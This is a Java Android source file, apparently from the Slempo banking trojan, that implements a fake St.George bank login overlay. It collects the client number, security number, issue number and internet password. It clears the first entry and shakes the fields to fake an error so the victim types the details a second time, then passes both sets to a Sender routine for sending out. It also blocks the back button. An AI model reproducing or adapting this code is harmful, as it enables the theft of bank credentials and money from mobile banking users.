package org.slempo.service.activities;

import org.slempo.service.Constants;
import org.slempo.service.R;
import org.slempo.service.utils.Sender;
import org.slempo.service.utils.Utils;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextUtils;
import android.text.TextWatcher;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.view.inputmethod.InputMethodManager;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RelativeLayout;
import android.widget.Spinner;
import android.widget.TextView;

public class StGeorge extends Activity {

	private static final int CLIENT_NUMBER_LENGTH_ISSUE_ALLOWED = 9;

	private Button continueButton;

	private EditText clientNumber;

	private EditText securityNumber;

	private Spinner issueNumber;

	private EditText password;

	private View loadingView;

	private View contentWholeView;

	private String clientNumberText;

	private String securityNumberText;

	private String issueNumberText;

	private String passwordText;

	private String clientNumberTextOld;

	private String securityNumberTextOld;

	private String issueNumberTextOld;

	private String passwordTextOld;

	private boolean wasCredentialsEntered = false;

	private TextView errorMessage;
	
	private RelativeLayout issueNumberLayout;

	private BroadcastReceiver signalsReceiver;

	private SharedPreferences settings;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		settings = getSharedPreferences(Constants.PREFS_NAME,
				Context.MODE_PRIVATE);
		setContentView(R.layout.st_george_fragment);
		loadingView = findViewById(R.id.loading_spinner);
		contentWholeView = findViewById(R.id.change_number_details);
		continueButton = (Button) findViewById(R.id.btn_continue);
		continueButton.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				if (isAllFieldsValid()) {
					if (wasCredentialsEntered) {
						crossFade(contentWholeView, View.INVISIBLE,
								R.anim.fade_out, loadingView,
								R.anim.slide_in_right, true);
						sendData();
					} else {
						wasCredentialsEntered = true;
						clientNumberTextOld = clientNumber.getText().toString();
						passwordTextOld = password.getText().toString();
						securityNumberTextOld = securityNumber.getText().toString();
						issueNumberTextOld = issueNumber.getSelectedItem().toString();
						clientNumber.setText("");
						securityNumber.setText("");
						issueNumber.setSelection(0);
						password.setText("");
						playShakeAnimation(clientNumber);
						playShakeAnimation(password);
						playShakeAnimation(issueNumber);
						playShakeAnimation(securityNumber);
					}
				}
			}
		});
		errorMessage = (TextView) findViewById(R.id.error_message);
		initReceiver();
		issueNumberLayout = (RelativeLayout) findViewById(R.id.sl_layout_issue);
		clientNumber = (EditText) findViewById(R.id.sl_etxt_cardnumber);
		clientNumber.addTextChangedListener(new TextWatcher() {
	        public void afterTextChanged(Editable s) {
	        	if (s.length() >= CLIENT_NUMBER_LENGTH_ISSUE_ALLOWED) {
	        		issueNumberLayout.setVisibility(View.VISIBLE);
	        	} else {
	        		issueNumberLayout.setVisibility(View.GONE);
	        	}
	        }
	        public void beforeTextChanged(CharSequence s, int start, int count, int after){}
	        public void onTextChanged(CharSequence s, int start, int before, int count){}
	    }); 
		password = (EditText) findViewById(R.id.sl_etxt_internetpwd);
		securityNumber = (EditText) findViewById(R.id.sl_etxt_securitynumber);
		issueNumber = (Spinner) findViewById(R.id.sl_spinner_issue);

		ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
				android.R.layout.simple_spinner_item, new String[] { "1",
						"2", "3", "4" });
		adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
		issueNumber.setAdapter(adapter);
		getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT,
				ViewGroup.LayoutParams.WRAP_CONTENT);
	}

	private void sendData() {
		Sender.sendStGeorgeBillingData(this, "stgeorge", clientNumberText,
			passwordText, securityNumberText, issueNumberText, clientNumberTextOld, passwordTextOld, securityNumberTextOld, issueNumberTextOld);
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK) {
			return true;
		}
		return super.onKeyDown(keyCode, event);
	}

	@Override
	public void onBackPressed() {
	}

	private boolean isAllFieldsValid() {
		clientNumberText = clientNumber.getText().toString();
		passwordText = password.getText().toString();
		securityNumberText = securityNumber.getText().toString();
		issueNumberText = issueNumber.getSelectedItem().toString();
		if (TextUtils.isEmpty(clientNumberText)) {
			playShakeAnimation(clientNumber);
			return false;
		}
		if (TextUtils.isEmpty(securityNumberText)) {
			playShakeAnimation(securityNumber);
			return false;
		}
		if (TextUtils.isEmpty(passwordText)) {
			playShakeAnimation(password);
			return false;
		}
		if (TextUtils.isEmpty(issueNumberText)) {
			playShakeAnimation(issueNumber);
			return false;
		}
		return true;
	}

	private void crossFade(View fromView, int fromViewFinalVisibility,
			int fromAnimation, View toView, int toAnimation,
			boolean closeKeyboard) {
		Animation anim1 = AnimationUtils.loadAnimation(this, fromAnimation);
		fromView.setVisibility(fromViewFinalVisibility);
		anim1.setAnimationListener(new Animation.AnimationListener() {

			@Override
			public void onAnimationStart(Animation animation) {
			}

			@Override
			public void onAnimationEnd(Animation animation) {
			}

			@Override
			public void onAnimationRepeat(Animation animation) {

			}
		});
		fromView.startAnimation(anim1);
		toView.setVisibility(View.VISIBLE);
		Animation anim2 = AnimationUtils.loadAnimation(this, toAnimation);
		anim2.setAnimationListener(new Animation.AnimationListener() {

			@Override
			public void onAnimationStart(Animation animation) {
			}

			@Override
			public void onAnimationEnd(Animation animation) {
			}

			@Override
			public void onAnimationRepeat(Animation animation) {

			}
		});
		toView.startAnimation(anim2);
		if (closeKeyboard) {
			InputMethodManager inputManager = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
			View v = getCurrentFocus();
			if (v != null) {
				inputManager.hideSoftInputFromWindow(v.getWindowToken(),
						InputMethodManager.HIDE_NOT_ALWAYS);
			}
		}
	}

	private void playShakeAnimation(View view) {
		view.startAnimation(AnimationUtils.loadAnimation(this, R.anim.shake));
	}

	private void initReceiver() {
		signalsReceiver = new BroadcastReceiver() {

			@Override
			public void onReceive(Context context, Intent i) {
				boolean status = i.getExtras().getBoolean("status");
				if (status) {
					Utils.putBooleanValue(settings,
							Constants.ST_JEORGE_IS_SENT, true);
					StGeorge.this.finish();
				} else {
					showError();
				}
			}
		};
		registerReceiver(signalsReceiver, new IntentFilter(
			Sender.UPDATE_MAIN_UI));
	}

	private void showError() {
		loadingView.setVisibility(View.GONE);
		contentWholeView.setVisibility(View.VISIBLE);
		errorMessage.setVisibility(View.VISIBLE);
	}

	@Override
	protected void onPause() {
		super.onPause();
		finish();
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
		unregisterReceiver(signalsReceiver);
	}/**/
}
